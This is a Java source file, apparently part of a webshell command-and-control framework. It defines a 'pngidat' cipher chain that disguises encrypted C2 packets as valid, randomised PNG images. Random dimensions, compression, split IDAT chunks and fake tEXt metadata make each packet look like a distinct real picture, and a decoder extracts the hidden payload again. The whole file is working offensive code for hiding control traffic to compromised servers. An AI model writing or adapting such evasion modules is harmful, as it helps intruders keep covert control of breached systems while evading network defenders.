package core.c2profile.chain.impl.pngidat;

import core.c2profile.C2ProfileContext;
import core.c2profile.c2annotation.C2ProfileCryption;
import core.c2profile.c2enum.CryptionChainEnum;
import core.c2profile.chain.AbstractC2ProfileCryptionChain;
import java.io.ByteArrayOutputStream;
import java.util.Arrays;
import java.util.Random;
import java.util.zip.CRC32;
import java.util.zip.Deflater;
import java.util.zip.Inflater;

/**
 * PNG-IDAT container chain (v2): builds a FULL valid PNG file around the ciphertext.
 * - IHDR dimensions random, proportional to data size (RGBA pixels ~ data/4)
 * - random deflate level 1-9, IDAT split into 1-3 chunks, random gAMA/tEXt ancillary chunks
 * Combined with empty channel markers, every C2 packet looks like a distinct real image.
 * Use as the LAST chain of requestEncryptionChain / responseDecryptionChain.
 */
@C2ProfileCryption(
        ChainName = "pngidat",
        supportPayload = {"JavaDynamicPayload", "PhpDynamicPayload", "CSharpDynamicPayload"}
)
public class CryptionPngIdatChain extends AbstractC2ProfileCryptionChain {
    private static final byte[] PNG_SIG = new byte[]{(byte)0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A};
    private static final String[] TEXT_KEYS = {"Comment", "Software", "Source", "Author"};

    public CryptionPngIdatChain() {
    }

    public void init(C2ProfileContext ctx, String payloadName, CryptionChainEnum mode, short cryptionIndex) throws Throwable {
        super.init(ctx, payloadName, mode, cryptionIndex);
    }

    protected boolean isAutoLoadProperties() {
        return true;
    }

    /** build a full valid PNG: random IHDR dims, optional gAMA, ciphertext in 1-3 IDAT chunks, random tEXt, IEND */
    public byte[] encrypt(byte[] data) throws Exception {
        Random rnd = new Random();
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        Deflater def = new Deflater(1 + rnd.nextInt(9));
        def.setInput(data);
        def.finish();
        byte[] buf = new byte[1024];
        while (!def.finished()) {
            bos.write(buf, 0, def.deflate(buf));
        }
        def.end();
        byte[] z = bos.toByteArray();

        int pixels = Math.max(1, data.length / 4);
        int w = Math.max(1, (int)Math.sqrt(pixels) + rnd.nextInt(3));
        int h = Math.max(1, (pixels + w - 1) / w);

        ByteArrayOutputStream out = new ByteArrayOutputStream();
        out.write(PNG_SIG);
        byte[] ihdr = new byte[13];
        ihdr[0] = (byte)(w >> 24); ihdr[1] = (byte)(w >> 16); ihdr[2] = (byte)(w >> 8); ihdr[3] = (byte)w;
        ihdr[4] = (byte)(h >> 24); ihdr[5] = (byte)(h >> 16); ihdr[6] = (byte)(h >> 8); ihdr[7] = (byte)h;
        ihdr[8] = 8; ihdr[9] = 6; // 8-bit RGBA
        writeChunk(out, "IHDR", ihdr);
        if (rnd.nextBoolean()) {
            writeChunk(out, "gAMA", new byte[]{0, 0, (byte)0xB1, (byte)0x8F});
        }
        int parts = z.length == 0 ? 1 : 1 + rnd.nextInt(Math.min(3, z.length));
        int start = 0;
        for (int i = 0; i < parts; i++) {
            int end;
            if (i == parts - 1) {
                end = z.length;
            } else {
                int remain = z.length - start - (parts - i - 1);
                end = start + 1 + rnd.nextInt(Math.max(1, remain - 1));
            }
            writeChunk(out, "IDAT", Arrays.copyOfRange(z, start, end));
            start = end;
        }
        int tn = rnd.nextInt(3);
        for (int i = 0; i < tn; i++) {
            String text = TEXT_KEYS[rnd.nextInt(TEXT_KEYS.length)] + (char)0
                    + Integer.toHexString(rnd.nextInt()) + Integer.toHexString(rnd.nextInt());
            writeChunk(out, "tEXt", text.getBytes("ISO-8859-1"));
        }
        writeChunk(out, "IEND", new byte[0]);
        return out.toByteArray();
    }

    private void writeChunk(ByteArrayOutputStream out, String type, byte[] data) throws Exception {
        out.write(new byte[]{(byte)(data.length >> 24), (byte)(data.length >> 16), (byte)(data.length >> 8), (byte)data.length});
        out.write(type.getBytes("US-ASCII"));
        out.write(data);
        CRC32 crc = new CRC32();
        crc.update(type.getBytes("US-ASCII"));
        crc.update(data);
        long v = crc.getValue();
        out.write(new byte[]{(byte)(v >> 24), (byte)(v >> 16), (byte)(v >> 8), (byte)v});
    }

    /** parse a full PNG file: concat all IDAT chunks, inflate. Tolerates trailing bytes after IEND. */
    public byte[] decrypt(byte[] png) throws Exception {
        if (png == null || png.length < 8
                || (png[0] & 255) != 0x89 || png[1] != 0x50 || png[2] != 0x4E || png[3] != 0x47) {
            throw new IllegalArgumentException("not a png container");
        }
        ByteArrayOutputStream idat = new ByteArrayOutputStream();
        int off = 8;
        while (off + 8 <= png.length) {
            int len = ((png[off] & 255) << 24) | ((png[off + 1] & 255) << 16) | ((png[off + 2] & 255) << 8) | (png[off + 3] & 255);
            boolean isIdat = png[off + 4] == 'I' && png[off + 5] == 'D' && png[off + 6] == 'A' && png[off + 7] == 'T';
            if (off + 12 + len > png.length) {
                break;
            }
            if (isIdat) {
                idat.write(png, off + 8, len);
            }
            off += 12 + len;
        }
        byte[] z = idat.toByteArray();
        if (z.length == 0) {
            throw new IllegalArgumentException("no IDAT chunk in png");
        }
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        Inflater inf = new Inflater();
        inf.setInput(z);
        byte[] buf = new byte[1024];
        while (!inf.finished()) {
            int n = inf.inflate(buf);
            if (n == 0) {
                // inflate() returns 0 when it cannot make progress. Without this check the loop
                // spins forever on a truncated stream -- and because decode() is synchronized,
                // the spinning thread also holds the channel monitor, so every later request
                // blocks on it: one packet goes out, then nothing, and the UI waits forever.
                //
                // finished() must be tested FIRST: a stream that completes on this very call
                // also returns 0 and also reports needsInput(), so testing needsInput() first
                // rejects perfectly good (e.g. empty-content) streams.
                if (inf.finished()) {
                    break;
                }
                if (inf.needsInput() || inf.needsDictionary()) {
                    inf.end();
                    throw new IllegalArgumentException("truncated deflate stream in png");
                }
            }
            out.write(buf, 0, n);
        }
        inf.end();
        return out.toByteArray();
    }
}
